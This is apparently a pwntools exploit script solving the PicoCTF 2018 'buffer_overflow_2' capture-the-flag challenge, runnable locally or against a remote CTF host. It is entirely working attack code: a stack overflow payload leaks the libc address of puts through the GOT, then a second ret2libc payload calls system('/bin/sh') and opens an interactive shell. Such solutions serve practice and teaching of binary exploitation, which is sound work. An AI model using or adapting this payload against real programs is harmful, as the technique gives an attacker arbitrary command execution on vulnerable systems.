import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./PicoCTF_2018_buffer_overflow_2')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./PicoCTF_2018_buffer_overflow_2')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
			ld = ELF('/lib/i386-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',26353)
			elf=ELF('./PicoCTF_2018_buffer_overflow_2')
			libc=ELF('../../i386libc/libc.so.6')
			ld = ELF('/lib/i386-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		io.recv()
		main=0x0804866d
		pay='a'*0x70+p32(elf.plt['puts'])+p32(main)+p32(elf.got['puts'])
		io.sendline(pay)


		
		libc_base=u32(io.recv(0x81)[-4:])-libc.sym['puts']
		libc.address=libc_base
		pay='a'*0x70+p32(libc.sym['system'])+p32(main)+p32(libc.search('/bin/sh\x00').next())
		io.sendline(pay)







		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue